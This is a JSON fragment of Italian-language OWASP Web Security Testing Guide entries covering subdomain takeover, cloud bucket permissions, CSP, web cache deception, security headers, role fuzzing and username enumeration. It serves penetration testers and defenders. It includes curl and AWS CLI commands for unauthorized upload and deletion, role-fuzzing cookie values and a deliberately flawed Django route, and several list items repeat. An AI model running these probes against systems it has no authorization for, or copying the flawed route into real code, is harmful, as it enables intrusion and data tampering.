      "summary": "<h3>Sommario</h3><p>Un attaccante può prendere il controllo di un sottodominio non più utilizzato o configurato erroneamente (subdomain takeover), sfruttando record DNS rimasti orfani (A, CNAME, MX, NS, TXT ecc.). Una volta preso il controllo, può pubblicare contenuti malevoli, condurre phishing o rubare sessioni/cookie degli utenti. Il rischio massimo si ha con takeover di record NS, che permettono il controllo totale della zona DNS.</p><h3>Obiettivi del test</h3><ul><li>Enumerare tutti i (sub)domini attuali e passati.</li><li>Identificare domini abbandonati, puntanti a servizi non più attivi, oppure a provider che permettono di reclamare il subdominio.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Effettua enumerazione DNS (con wordlist o OSINT). Usa <code>dig</code>, <code>dnsrecon</code>, <code>amass</code>, <code>theHarvester</code>, <code>Sublist3r</code> ecc. Analizza la risposta DNS a richieste su sottodomini sospetti. Cerca risposte <code>NXDOMAIN</code>, <code>SERVFAIL</code> o <code>REFUSED</code>.<br>Usa <code>whois</code> sugli IP per capire se appartengono a servizi come GitHub Pages, Heroku, AWS, Azure, ecc.<br>Se la risorsa può essere reclamata su questi provider e risponde 404, è potenzialmente vulnerabile.</p><p>Verifica la presenza di NS scaduti e se possono essere registrati da chiunque. Se sì, il rischio è massimo.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>dig</li><li>dnsrecon</li><li>OWASP Amass</li><li>theHarvester</li><li>Sublist3r</li><li>recon-ng</li><li>OWASP Domain Protect</li></ul><h3>Riferimenti</h3><ul><li>HackerOne: A Guide To Subdomain Takeovers</li><li>can-i-take-over-xyz</li><li>OWASP AppSec Europe 2017 - DNS hijacking using cloud providers</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Rimuovere i record DNS orfani o non utilizzati dalla zona DNS.</li><li>Monitorare e verificare periodicamente la configurazione DNS per evitare takeover accidentali.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-CONF-11": {
      "summary": "<h3>Riassunto</h3><p>I servizi di cloud storage consentono alle applicazioni web e ai servizi di memorizzare e accedere agli oggetti nel servizio di archiviazione. Una configurazione impropria del controllo degli accessi, tuttavia, può portare all'esposizione di informazioni sensibili, alla manomissione dei dati o all'accesso non autorizzato.</p><p>Un esempio noto è quando un bucket Amazon S3 è configurato erroneamente, anche se altri servizi di cloud storage possono essere esposti a rischi simili. Per impostazione predefinita, tutti i bucket S3 sono privati e possono essere accessibili solo dagli utenti a cui è stato esplicitamente concesso l'accesso. Gli utenti possono concedere l'accesso pubblico non solo al bucket stesso ma anche ai singoli oggetti memorizzati all'interno di quel bucket. Questo può portare a un utente non autorizzato che è in grado di caricare nuovi file, modificare o leggere file memorizzati.</p><h3>Obiettivi del Test</h3><ul><li>Valutare che la configurazione del controllo degli accessi per i servizi di storage sia correttamente implementata.</li></ul>",
      "how-to": "<h3>Come Testare</h3><p>Prima, identifica l'URL per accedere ai dati nel servizio di storage, quindi considera i seguenti test:</p><ul><li>leggere dati non autorizzati</li><li>caricare un nuovo file arbitrario</li></ul><p>Puoi utilizzare curl per i test con i seguenti comandi e vedere se le azioni non autorizzate possono essere eseguite con successo.</p><p>Per testare la capacità di leggere un oggetto:</p><pre><code>curl -X GET https://<cloud-storage-service>/<object></code></pre><p>Per testare la capacità di caricare un file:</p><pre><code>curl -X PUT -d 'test' 'https://<cloud-storage-service>/test.txt'</code></pre><p>Nel comando sopra, si raccomanda di sostituire le virgolette singole (') con virgolette doppie (\") quando si esegue il comando su una macchina Windows.</p><p>Gli URL dei bucket Amazon S3 seguono uno di due formati, either virtual host style o path-style.</p><ul><li>Virtual Hosted Style Access</li></ul><pre><code>https://bucket-name.s3.Region.amazonaws.com/key-name</code></pre><p>Nel seguente esempio, my-bucket è il nome del bucket, us-west-2 è la regione, e puppy.png è il key-name:</p><pre><code>https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png</code></pre><ul><li>Path-Style Access</li></ul><pre><code>https://s3.Region.amazonaws.com/bucket-name/key-name</code></pre><p>Come sopra, nel seguente esempio, my-bucket è il nome del bucket, us-west-2 è la regione, e puppy.png è il key-name:</p><pre><code>https://s3.us-west-2.amazonaws.com/my-bucket/puppy.png</code></pre><p>Per alcune regioni, l'endpoint globale legacy che non specifica un endpoint specifico per regione può essere utilizzato. Il suo formato è anche either virtual hosted style o path-style.</p><ul><li>Virtual Hosted Style Access</li></ul><pre><code>https://bucket-name.s3.amazonaws.com</code></pre><ul><li>Path-Style Access</li></ul><pre><code>https://s3.amazonaws.com/bucket-name</code></pre><p>Per il black-box testing, gli URL S3 possono essere trovati nei messaggi HTTP. Il seguente esempio mostra un URL del bucket inviato nel tag img in una risposta HTTP.</p><pre><code>... <img src= \"https://my-bucket.s3.us-west-2.amazonaws.com/puppy.png\" > ...</code></pre><p>Per il gray-box testing, puoi ottenere gli URL dei bucket dall'interfaccia web di Amazon, documenti, codice sorgente e qualsiasi altra fonte disponibile.</p><p>Oltre al testing con curl, puoi anche testare con lo strumento da riga di comando AWS. In questo caso viene utilizzato lo schema URI s3://.</p><p>Il seguente comando elenca tutti gli oggetti del bucket quando è configurato pubblico:</p><pre><code>aws s3 ls s3://<bucket-name></code></pre><p>Il seguente è il comando per caricare un file:</p><pre><code>aws s3 cp arbitrary-file s3://bucket-name/path-to-save</code></pre><p>Questo esempio mostra il risultato quando l'upload è stato completato con successo.</p><pre><code>$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload: ./test.txt to s3://bucket-name/test.txt</code></pre><p>Questo esempio mostra il risultato quando l'upload è fallito.</p><pre><code>$ aws s3 cp test.txt s3://bucket-name/test.txt\nupload failed: ./test2.txt to s3://bucket-name/test2.txt An error occurred ( AccessDenied ) when calling the PutObject operation: Access Denied</code></pre><p>Il seguente è il comando per rimuovere un oggetto:</p><pre><code>aws s3 rm s3://bucket-name/object-to-remove</code></pre>",
      "tools": "<h3>Strumenti</h3><ul><li>AWS CLI</li></ul><h3>Riferimenti</h3><ul><li>Working with Amazon S3 Buckets</li><li>flAWS 2 - Learn AWS Security</li><li>curl Tutorial</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-12": {
      "summary": "<h3>Riassunto</h3><p>Content Security Policy (CSP) è una policy dichiarativa di allow-list applicata tramite l'header di risposta Content-Security-Policy o l'elemento <meta> equivalente. Consente agli sviluppatori di limitare le fonti da cui possono essere caricate risorse come JavaScript, CSS, immagini, file ecc. CSP è una tecnica efficace di defense in depth per mitigare il rischio di vulnerabilità come Cross Site Scripting (XSS) e Clickjacking.</p><p>Content Security Policy supporta direttive che consentono un controllo granulare al flusso delle policy. (Vedi Riferimenti per ulteriori dettagli.)</p><h3>Obiettivi del Test</h3><ul><li>Rivedere l'header Content-Security-Policy o l'elemento meta per identificare configurazioni errate.</li></ul>",
      "how-to": "<h3>Come Testare</h3><p>Per testare configurazioni errate nelle CSP, cerca configurazioni insicure esaminando l'header di risposta HTTP Content-Security-Policy o l'elemento meta CSP in uno strumento proxy:</p><ul><li>La direttiva unsafe-inline abilita script o stili inline, rendendo le applicazioni suscettibili ad attacchi XSS.</li><li>La direttiva unsafe-eval consente l'uso di eval() nell'applicazione ed è suscettibile a tecniche di bypass comuni come l'iniezione di data URL.</li><li>La direttiva unsafe-hashes consente l'uso di script/stili inline, assumendo che corrispondano agli hash specificati.</li><li>Risorse come script possono essere consentite per essere caricate da qualsiasi origine tramite l'uso di wildcard (*) source. Considera anche wildcard basate su corrispondenze parziali, come: https://* o *.cdn.com. Considera se le fonti in allow list forniscono endpoint JSONP che potrebbero essere utilizzati per bypassare CSP o same-origin-policy.</li><li>Considera anche wildcard basate su corrispondenze parziali, come: https://* o *.cdn.com.</li><li>Considera se le fonti in allow list forniscono endpoint JSONP che potrebbero essere utilizzati per bypassare CSP o same-origin-policy.</li><li>Il framing può essere abilitato per tutte le origini tramite l'uso di wildcard (*) source per la direttiva frame-ancestors. Se la direttiva frame-ancestors non è definita nell'header Content-Security-Policy può rendere le applicazioni vulnerabili ad attacchi di clickjacking.</li><li>Le applicazioni business critical dovrebbero richiedere l'uso di una policy strict.</li></ul><ul><li>Considera anche wildcard basate su corrispondenze parziali, come: https://* o *.cdn.com.</li><li>Considera se le fonti in allow list forniscono endpoint JSONP che potrebbero essere utilizzati per bypassare CSP o same-origin-policy.</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>Google CSP Evaluator</li><li>CSP Auditor - Burp Suite Extension</li><li>CSP Generator Chrome/Firefox</li></ul><h3>Riferimenti</h3><ul><li>OWASP Content Security Policy Cheat Sheet</li><li>Mozilla Developer Network: Content Security Policy</li><li>CSP Level 3 W3C</li><li>CSP with Google</li><li>Content-Security-Policy</li><li>Google CSP Evaluator</li><li>CSP A Successful Mess Between Hardening And Mitigation</li><li>The unsafe-hashes Source List Keyword</li></ul>",
      "remediation": "<h3>Rimedio</h3><p>Configura una content security policy forte che riduca la superficie di attacco dell'applicazione. Gli sviluppatori possono verificare la forza della content security policy utilizzando strumenti online come Google CSP Evaluator.</p><p>Una policy strict è una policy che fornisce protezione contro attacchi XSS stored, reflected e alcuni DOM XSS classici e dovrebbe essere l'obiettivo ottimale di qualsiasi team che cerca di implementare CSP.</p><p>Google ha creato una guida per adottare una CSP strict basata su nonce. Basandosi su una presentazione a LocoMocoSec, le seguenti due policy possono essere utilizzate per applicare una policy strict:</p><p>Policy Strict Moderata:</p><pre><code>script-src 'nonce-r4nd0m' 'strict-dynamic';\nobject-src 'none'; base-uri 'none';</code></pre><p>Policy Strict Bloccata:</p><pre><code>script-src 'nonce-r4nd0m';\nobject-src 'none'; base-uri 'none';</code></pre><ul><li>La direttiva script-src è utilizzata per limitare le fonti da cui gli script possono essere caricati ed eseguiti.</li><li>La direttiva object-src è utilizzata per limitare le fonti da cui gli oggetti possono essere caricati ed eseguiti.</li><li>La direttiva base-uri specifica l'URL base per risolvere URL relativi nella pagina. Senza questa direttiva, la pagina diventa vulnerabile ad attacchi di iniezione del tag base HTML.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-CONF-13": {
      "summary": "<h3>Riassunto</h3><p>La configurazione corretta dei percorsi dell'applicazione è importante perché, se i percorsi non sono configurati correttamente, permettono a un attaccante di sfruttare altre vulnerabilità in una fase successiva utilizzando questa configurazione errata.</p><p>Ad esempio, se le route non sono configurate correttamente e il target utilizza anche una CDN, l'attaccante può utilizzare questa configurazione errata per eseguire attacchi di web cache deception.</p><p>Di conseguenza, per prevenire altri attacchi, questa configurazione dovrebbe essere valutata dal tester.</p><h3>Obiettivi del Test</h3><ul><li>Assicurarsi che i percorsi dell'applicazione siano configurati correttamente.</li></ul>",
      "how-to": "<h3>Come Testare</h3><p>In uno scenario di black-box testing, il tester dovrebbe sostituire tutti i percorsi esistenti con percorsi che non esistono, e poi esaminare il comportamento e il codice di stato del target.</p><p>Ad esempio, c'è un percorso nell'applicazione che è una dashboard e mostra l'importo del saldo del conto dell'utente (soldi, crediti di gioco, ecc).</p><p>Supponiamo che il percorso sia https://example.com/user/dashboard, il tester dovrebbe testare le diverse modalità che lo sviluppatore potrebbe aver considerato per questo percorso. Per le vulnerabilità di Web Cache Deception l'analista dovrebbe considerare un percorso come https://example.com/user/dashboard/non.js se le informazioni della dashboard sono visibili, e il target utilizza una CDN (o altra web cache), allora gli attacchi di Web Cache Deception sono probabilmente applicabili.</p><p>Esamina la configurazione del routing dell'applicazione. La maggior parte delle volte, gli sviluppatori utilizzano espressioni regolari nel routing dell'applicazione.</p><p>In questo esempio, nel file urls.py di un'applicazione framework Django, vediamo un esempio di Path Confusion. Lo sviluppatore non ha utilizzato l'espressione regolare corretta risultando in una vulnerabilità:</p><pre><code>from django.urls import re_path from . import views urlpatterns = [ re_path ( r '.*^dashboard' , views . path_confusion , name = 'index' ), ]</code></pre><p>Se il percorso https://example.com/dashboard/none.js è anche aperto dall'utente nel browser, le informazioni della dashboard dell'utente possono essere visualizzate, e se il target utilizza una CDN o web cache, può essere implementato un attacco di Web Cache Deception.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Zed Attack Proxy</li><li>Burp Suite</li></ul>",
      "remediation": "<h3>Rimedio</h3><ul><li>Astenersi dal classificare/gestire la cache basata sull'estensione del file o percorso (utilizzare content-type).</li><li>Assicurarsi che il meccanismo(i) di caching aderiscano agli header cache-control specificati dalla tua applicazione.</li><li>Implementare la gestione RFC compliant di File Not Found e redirect.</li></ul><h3>Riferimenti</h3><ul><li>Bypassing Web Cache Poisoning Countermeasures</li><li>Path confusion: Web cache deception threatens user information online</li><li>Web Cache Deception Attack</li></ul>",
      "test_objectives": ""
    },
    "WSTG-CONF-14": {
      "summary": "<h3>Riassunto</h3><p>Gli header di sicurezza svolgono un ruolo vitale nella protezione delle applicazioni web da un'ampia gamma di attacchi, inclusi Cross-Site Scripting (XSS), Clickjacking e attacchi di iniezione dati. Questi header istruiscono il browser su come gestire gli aspetti relativi alla sicurezza della comunicazione di un sito web, riducendo l'esposizione a vettori di attacco noti. Tuttavia, configurazioni errate possono portare a vulnerabilità, indebolendo le protezioni di sicurezza previste o rendendole inefficaci. Questa sezione delinea configurazioni errate comuni degli header di sicurezza, i loro rischi e come testarle correttamente.</p><h3>Obiettivi del Test</h3><ul><li>Identificare header di sicurezza configurati impropriamente.</li><li>Valutare l'impatto degli header di sicurezza configurati erroneamente.</li><li>Validare l'implementazione corretta degli header di sicurezza richiesti.</li></ul><h3>Configurazioni Errate Comuni degli Header di Sicurezza</h3><ul><li>Header di Sicurezza con Valore Vuoto: Header che sono presenti ma mancano di un valore possono essere ignorati dai browser, rendendoli inefficaci.</li><li>Header di Sicurezza con Valore o Nome Non Valido (Errori di Battitura): Nomi di header incorretti o errori di ortografia risultano in header non riconosciuti o non applicati.</li><li>Header di Sicurezza Eccessivamente Permissivi: Header configurati troppo ampiamente (ad es., utilizzando caratteri wildcard * o direttive eccessivamente permissive) possono far trapelare informazioni o consentire l'accesso a risorse oltre l'ambito previsto.</li><li>Header di Sicurezza Duplicati: Occorrenze multiple dello stesso header con valori in conflitto possono portare a comportamenti imprevedibili del browser, potenzialmente disabilitando completamente le misure di sicurezza.</li><li>Header Legacy o Deprecati: L'inclusione di header obsoleti (ad es., HPKP) o direttive (ad es., ALLOW-FROM in X-Frame-Options) che non sono più supportati dai browser moderni può creare rischi non necessari.</li><li>Posizionamento Non Valido degli Header di Sicurezza: Alcuni header sono efficaci solo sotto condizioni specifiche. Ad esempio, header come HSTS devono essere consegnati su HTTPS; se inviati su HTTP, diventano inefficaci.</li><li>Errori di Gestione META Tag: Nei casi in cui policy di sicurezza come Content-Security-Policy (CSP) sono applicate tramite sia header HTTP che META tag (utilizzando http-equiv), c'è il rischio che il valore del META tag possa sovrascrivere o entrare in conflitto con la logica sicura definita nell'header HTTP. Questo può portare a uno scenario in cui una policy insicura prende inavvertitamente la precedenza, indebolendo la postura di sicurezza complessiva.</li></ul><h3>Rischi degli Header di Sicurezza Configurati Erroneamente</h3><ul><li>Efficacia Ridotta: Header configurati erroneamente potrebbero non fornire la protezione prevista, lasciando l'applicazione vulnerabile ad attacchi come XSS, Clickjacking o exploit relativi a CORS.</li><li>Rottura delle Misure di Sicurezza: Header duplicati o direttive in conflitto possono risultare nei browser che ignorano completamente gli header di sicurezza HTTP, disabilitando così le protezioni previste.</li><li>Introduzione di Nuovi Vettori di Attacco: L'uso di header legacy o deprecati può introdurre rischi piuttosto che mitigarli se i browser moderni non supportano più le misure di sicurezza previste.</li></ul>",
      "how-to": "<h3>Come Testare</h3><p>Per ispezionare gli header di sicurezza utilizzati da un'applicazione, impiega i seguenti metodi:</p><ul><li>Proxy Intercettanti: Utilizza strumenti come Burp Suite per analizzare le risposte del server.</li><li>Strumenti da Riga di Comando: Esegui un comando curl per recuperare gli header di risposta HTTP: curl -I https://example.com A volte l'applicazione web reindirizza a una nuova pagina, per seguire il redirect usa il seguente comando: curl -L -I https://example.com Alcuni Firewall possono bloccare lo User-Agent predefinito di curl e alcuni errori TLS/SSL impediranno anche di restituire le informazioni corrette, in questo caso potresti provare a utilizzare il seguente comando: curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com</li><li>A volte l'applicazione web reindirizza a una nuova pagina, per seguire il redirect usa il seguente comando: curl -L -I https://example.com</li><li>Alcuni Firewall possono bloccare lo User-Agent predefinito di curl e alcuni errori TLS/SSL impediranno anche di restituire le informazioni corrette, in questo caso potresti provare a utilizzare il seguente comando: curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com</li><li>Strumenti di Sviluppo del Browser: Apri gli strumenti di sviluppo (F12), naviga alla scheda Network, seleziona una richiesta e visualizza la sezione Headers.</li></ul><ul><li>A volte l'applicazione web reindirizza a una nuova pagina, per seguire il redirect usa il seguente comando: curl -L -I https://example.com</li><li>Alcuni Firewall possono bloccare lo User-Agent predefinito di curl e alcuni errori TLS/SSL impediranno anche di restituire le informazioni corrette, in questo caso potresti provare a utilizzare il seguente comando: curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com</li></ul><ul><li>Identifica Header Rischiosi: Cerca header che potrebbero consentire accesso eccessivo, come:</li><li>Valuta Direttive: Verifica se sono applicate direttive strict. Ad esempio, una configurazione eccessivamente permissiva potrebbe apparire come: Access-Control-Allow-Origin: *\n  Access-Control-Allow-Credentials: true\n  X-Permitted-Cross-Domain-Policies: all\n  Referrer-Policy: unsafe-url Una configurazione sicura sembrerebbe: Access-Control-Allow-Origin: {theallowedoriginurl}\n  X-Permitted-Cross-Domain-Policies: none\n  Referrer-Policy: no-referrer</li><li>Riferimenti Incrociati alla Documentazione: Utilizza risorse come Mozilla Developer Network: Security Headers per rivedere direttive sicure e insicure.</li></ul><p>Valuta Direttive: Verifica se sono applicate direttive strict. Ad esempio, una configurazione eccessivamente permissiva potrebbe apparire come:</p><pre><code>Access-Control-Allow-Origin: *\n  Access-Control-Allow-Credentials: true\n  X-Permitted-Cross-Domain-Policies: all\n  Referrer-Policy: unsafe-url</code></pre><p>Una configurazione sicura sembrerebbe:</p><pre><code>Access-Control-Allow-Origin: {theallowedoriginurl}\n  X-Permitted-Cross-Domain-Policies: none\n  Referrer-Policy: no-referrer</code></pre><ul><li>Header Duplicati: Assicurati che lo stesso header non sia definito più volte con valori in conflitto.</li><li>Header Obsoleti: Identifica e rimuovi header deprecati (ad es., HPKP) e direttive obsolete (ad es., ALLOW-FROM in X-Frame-Options). Fai riferimento a fonti come Mozilla Developer Network: X-Frame-Options per gli standard attuali.</li></ul><ul><li>Requisiti Specifici del Protocollo: Valida che gli header destinati a contesti sicuri (ad es., HSTS) siano consegnati solo sotto condizioni appropriate (cioè, su HTTPS).</li><li>Consegna Condizionale: Alcuni header possono essere efficaci solo sotto circostanze specifiche. Verifica che queste condizioni siano soddisfatte perché l'header funzioni come previsto.</li></ul><ul><li>Controlli di Doppia Applicazione: Quando una policy di sicurezza come CSP è applicata tramite sia un header HTTP che un META tag utilizzando http-equiv, conferma che l'header HTTP (che è generalmente considerato più autorevole) non sia inavvertitamente sovrascritto dal META tag.</li><li>Rivedi Comportamento del Browser: Testa l'applicazione in vari browser per vedere se si verificano differenze a causa della presenza di direttive in conflitto. Dove possibile, evita di utilizzare definizioni doppie per prevenire lacune di sicurezza non intenzionali.</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>Mozilla Observatory</li><li>ZAP</li><li>Burp Suite</li><li>Browser Developer Tools (Chrome, Firefox, Edge)</li></ul><h3>Riferimenti</h3><ul><li>OWASP Secure Headers Project</li><li>Mozilla Developer Network: Security Headers</li><li>RFC 6797 - HTTP Strict Transport Security (HSTS)</li><li>Google Web Security Guidelines</li><li>HPKP is No More</li></ul>",
      "remediation": "<h3>Rimedio</h3><ul><li>Configurazione Corretta degli Header: Assicurati che gli header siano implementati correttamente con valori appropriati e senza errori di battitura.</li><li>Applica Direttive Strict: Configura gli header con le impostazioni più sicure che permettano ancora la funzionalità richiesta. Ad esempio, evita di utilizzare * nelle policy CORS a meno che non sia assolutamente necessario.</li><li>Rimuovi Header Deprecati: Sostituisci gli header di sicurezza legacy con equivalenti moderni e rimuovi quelli che non sono più supportati.</li><li>Evita Definizioni in Conflitto: Previeni definizioni di header duplicate e assicurati che i META tag non entrino in conflitto con gli header HTTP per le policy di sicurezza.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-IDNT-01": {
      "summary": "<h3>Riassunto</h3><p>Le applicazioni hanno diversi tipi di funzionalità e servizi, e questi richiedono permessi di accesso basati sulle esigenze dell'utente. Quell'utente potrebbe essere:</p><ul><li>un amministratore, dove gestisce le funzionalità dell'applicazione.</li><li>un auditor, dove rivede le transazioni dell'applicazione e fornisce un rapporto dettagliato.</li><li>un ingegnere di supporto, dove aiuta i clienti a debuggare e risolvere problemi sui loro account.</li><li>un cliente, dove interagisce con l'applicazione e beneficia dei suoi servizi.</li></ul><p>Per gestire questi usi e qualsiasi altro caso d'uso per quell'applicazione, vengono impostate definizioni di ruolo (più comunemente conosciute come RBAC). Basandosi su questi ruoli, l'utente è in grado di portare a termine il compito richiesto.</p><h3>Obiettivi del Test</h3><ul><li>Identificare e documentare i ruoli utilizzati dall'applicazione.</li><li>Tentare di cambiare, modificare o accedere a un altro ruolo.</li><li>Rivedere la granularità dei ruoli e le esigenze dietro i permessi dati.</li></ul>",
      "how-to": "<h3>Come Testare</h3><p>Il tester dovrebbe iniziare identificando i ruoli dell'applicazione che vengono testati attraverso uno dei seguenti metodi:</p><ul><li>Documentazione dell'applicazione.</li><li>Guida dagli sviluppatori o amministratori dell'applicazione.</li><li>Commenti dell'applicazione.</li><li>Fare fuzzing dei possibili ruoli: variabile cookie (ad es. role=admin, isAdmin=True) variabile account (ad es. Role: manager) directory o file nascosti (ad es. /admin, /mod, /backups) passaggio a utenti ben noti (ad es. admin, backups, ecc.)</li><li>variabile cookie (ad es. role=admin, isAdmin=True)</li><li>variabile account (ad es. Role: manager)</li><li>directory o file nascosti (ad es. /admin, /mod, /backups)</li><li>passaggio a utenti ben noti (ad es. admin, backups, ecc.)</li></ul><ul><li>variabile cookie (ad es. role=admin, isAdmin=True)</li><li>variabile account (ad es. Role: manager)</li><li>directory o file nascosti (ad es. /admin, /mod, /backups)</li><li>passaggio a utenti ben noti (ad es. admin, backups, ecc.)</li></ul><p>Dopo aver identificato possibili vettori di attacco, il tester deve testare e validare che possano accedere ai ruoli disponibili.</p><p>Alcune applicazioni definiscono i ruoli dell'utente alla creazione, attraverso controlli e policy rigorosi, o assicurandosi che il ruolo dell'utente sia correttamente protetto attraverso una firma creata dal backend. Trovare che esistono ruoli non significa che siano una vulnerabilità.</p><p>Dopo aver ottenuto l'accesso ai ruoli sul sistema, il tester deve comprendere i permessi forniti a ciascun ruolo.</p><p>Un ingegnere di supporto non dovrebbe essere in grado di condurre funzionalità amministrative, gestire i backup o condurre transazioni al posto di un utente.</p><p>Un amministratore non dovrebbe avere pieni poteri sul sistema. Le funzionalità amministrative sensibili dovrebbero sfruttare un principio maker-checker, o utilizzare MFA per assicurarsi che l'amministratore stia conducendo la transazione. Un esempio chiaro su questo è stato l'incidente Twitter del 2020.</p>",
      "tools": "<h3>Strumenti</h3><p>I test sopra menzionati possono essere condotti senza l'uso di alcuno strumento, eccetto quello utilizzato per accedere al sistema.</p><p>Per rendere le cose più facili e più documentate, si può utilizzare:</p><ul><li>Estensione Autorize di Burp</li><li>Add-on Access Control Testing di ZAP</li></ul><h3>Riferimenti</h3><ul><li>Role Engineering for Enterprise Security Management, E Coyne & J Davis, 2007</li><li>Role engineering and RBAC standards</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-IDNT-02": {
      "summary": "<h3>Riassunto</h3><p>Alcuni siti web offrono un processo di registrazione utente che automatizza (o semi-automatizza) la fornitura dell'accesso al sistema agli utenti. I requisiti di identità per l'accesso variano dall'identificazione positiva a nessuna identificazione, a seconda dei requisiti di sicurezza del sistema. Molte applicazioni pubbliche automatizzano completamente il processo di registrazione e provisioning perché la dimensione della base utenti rende impossibile la gestione manuale. Tuttavia, molte applicazioni aziendali provvederanno al provisioning degli utenti manualmente, quindi questo caso di test potrebbe non applicarsi.</p><h3>Obiettivi del Test</h3><ul><li>Verificare che i requisiti di identità per la registrazione utente siano allineati con i requisiti aziendali e di sicurezza.</li><li>Validare il processo di registrazione.</li></ul>",
      "how-to": "<h3>Come Testare</h3><p>Verifica che i requisiti di identità per la registrazione utente siano allineati con i requisiti aziendali e di sicurezza:</p><p>Valida il processo di registrazione:</p><p>Nell'esempio WordPress qui sotto, l'unico requisito di identificazione è un indirizzo email accessibile al registrante.</p><p>Figura 4.3.2-1: Pagina di Registrazione WordPress</p><br><p>Al contrario, nell'esempio Google qui sotto i requisiti di identificazione includono nome, data di nascita, paese, numero di telefono cellulare, indirizzo email e risposta CAPTCHA. Mentre solo due di questi possono essere verificati (indirizzo email e numero cellulare), i requisiti di identificazione sono più rigorosi di WordPress.</p><p>Figura 4.3.2-2: Pagina di Registrazione Google</p><br>",
      "tools": "<h3>Strumenti</h3><p>Un proxy HTTP può essere uno strumento utile per testare questo controllo.</p><h3>Riferimenti</h3><p>User Registration Design</p>",
      "remediation": "<h3>Rimedio</h3><p>Implementa requisiti di identificazione e verifica che corrispondano ai requisiti di sicurezza delle informazioni che le credenziali proteggono.</p>",
      "test_objectives": ""
    },
    "WSTG-IDNT-03": {
      "summary": "<h3>Riassunto</h3><p>Il provisioning degli account presenta un'opportunità per un attaccante di creare un account valido senza l'applicazione del processo di identificazione e autorizzazione appropriato.</p><h3>Obiettivi del Test</h3><ul><li>Verificare quali account possono fare il provisioning di altri account e di che tipo.</li></ul>",
      "how-to": "<h3>Come Testare</h3><p>Determina quali ruoli sono in grado di fare il provisioning degli utenti e che tipo di account possono creare.</p><ul><li>C'è qualche verifica, controllo e autorizzazione delle richieste di provisioning?</li><li>C'è qualche verifica, controllo e autorizzazione delle richieste di de-provisioning?</li><li>Un amministratore può fare il provisioning di altri amministratori o solo utenti?</li><li>Un amministratore o altro utente può fare il provisioning di account con privilegi maggiori dei propri?</li><li>Un amministratore o utente può fare il de-provisioning di se stesso?</li><li>Come vengono gestiti i file o le risorse possedute dall'utente de-provisionato? Vengono eliminati? L'accesso viene trasferito?</li></ul><p>In WordPress, sono richiesti solo il nome dell'utente e l'indirizzo email per fare il provisioning dell'utente, come mostrato qui sotto:</p><p>Figura 4.3.3-1: Aggiunta Utente WordPress</p><br><p>Il de-provisioning degli utenti richiede all'amministratore di selezionare gli utenti da de-provisionare, selezionare Elimina dal menu a discesa (cerchiato) e quindi applicare questa azione. All'amministratore viene quindi presentata una finestra di dialogo che chiede cosa fare con i post dell'utente (eliminarli o trasferirli).</p><p>Figura 4.3.3-2: Autenticazione e Utenti WordPress</p><br>",
      "tools": "<h3>Strumenti</h3><p>Mentre l'approccio più completo e accurato per completare questo test è condurlo manualmente, anche gli strumenti proxy HTTP potrebbero essere utili.</p>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-IDNT-04": {
      "summary": "<h3>Sommario</h3><p>Lo scopo di questo test è verificare se sia possibile ottenere una lista di username validi interagendo con il meccanismo di autenticazione dell’applicazione. Questa informazione è fondamentale per i successivi attacchi di brute force, dove, disponendo di uno username valido, si cerca di indovinare la password associata. Le applicazioni web spesso rivelano l’esistenza di uno username tramite messaggi di errore diversi o dettagliati, sia per errore di configurazione sia per scelta progettuale. Ad esempio, la risposta a credenziali errate può cambiare se lo username è valido ma la password è errata, oppure se entrambi sono errati. Queste differenze permettono all’attaccante di enumerare utenti validi per attacchi mirati.</p><h3>Obiettivi del test</h3><ul><li>Esaminare i processi di identificazione utente (es. registrazione, login, recupero password, modifica profilo).</li><li>Enumerare username validi attraverso l’analisi delle risposte dell’applicazione.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Esegui richieste di login con combinazioni di username validi/inesistenti e password corrette/errate, osservando la risposta dell’applicazione sia a livello di messaggio che di HTTP status code, dimensione della risposta, titoli delle pagine, eventuali reindirizzamenti o dettagli tecnici rivelati.</li><li>Analizza le risposte anche in fase di registrazione e recupero password: se l’applicazione segnala esplicitamente la non esistenza di un utente, è vulnerabile a username enumeration.</li><li>Prova a determinare pattern ricorrenti negli username (es: nome.cognome, iniziale+cognome, progressivo, email).</li><li>Usa wordlist di nomi comuni, pattern di username, dizionari pubblici (Google, LinkedIn, LDAP leak, ecc.) e automatizza il processo tramite script (curl, Perl, ZAP, Burp, ecc.).</li><li>Valuta anche le tempistiche delle risposte: un tempo di risposta più lungo per username esistenti può essere un side-channel utile all’attaccante.</li><li>Verifica che non sia possibile registrare o modificare il proprio username scegliendo nomi riservati (admin, administrator, root, ecc.), inclusi casi con variazione di maiuscole/minuscole.</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>Burp Suite / ZAP Proxy</li><li>curl</li><li>Script in Perl, Python, Bash</li></ul><h3>Riferimenti</h3><ul><li>Username Enumeration Vulnerabilities</li><li>Prevent WordPress Username Enumeration</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Restituire sempre messaggi di errore generici e identici per login falliti, sia per username inesistenti sia per password errate.</li><li>Impedire la registrazione e la modifica di username riservati o già esistenti, anche considerando maiuscole/minuscole.</li><li>Eliminare account di default e di test prima della messa in produzione.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-IDNT-05": {
